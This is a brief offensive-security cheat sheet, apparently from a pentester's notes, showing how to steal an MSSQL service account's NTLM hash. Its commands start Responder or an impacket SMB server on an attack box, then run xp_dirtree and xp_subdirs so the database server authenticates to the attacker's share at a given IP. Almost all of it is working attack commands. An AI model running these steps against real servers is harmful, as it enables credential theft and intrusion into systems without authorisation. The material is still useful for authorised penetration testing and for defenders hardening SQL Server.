-- -
Get the MSSQL server to try to communicate with a fake SMB server and pull the hash from that authentication using responser. 
### Setup Responder
```bash
# on attack machine
sudo responder -I <interface>
sudo responder -I tun0
```
### Setup smbserver
Alternatively, you can setup a fake malicious smb share on the attack box and see the hash there.
```bash
sudo impacket-smbserver share ./ -smb2suppport
```
### Send Hash to responder
```mysql
# xp_dirtree
EXEC master..xp_dirtree '\\<attack ip>\<share>'
GO
EXEC master..xp_dirtree '\\10.10.110.17\share'
GO

# xp_subdirs
EXEC master..xp_subdirs '\\<attack ip>\<share>'
GO
EXEC master..xp_subdirs '\\10.10.110.17\share'
GO
```
